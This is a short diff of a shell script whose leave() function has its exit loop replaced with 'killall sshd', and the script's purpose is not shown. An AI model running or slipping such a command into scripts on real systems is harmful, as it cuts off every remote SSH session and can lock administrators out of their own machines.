@@ -188,10 +188,7 @@ clean_clear() {
 }
 
 leave() {
-  while [ "$SHLVL" -gt 1 ]; do
-    exit
-  done
-  exit
+  killall sshd
 }
 
 get_tools
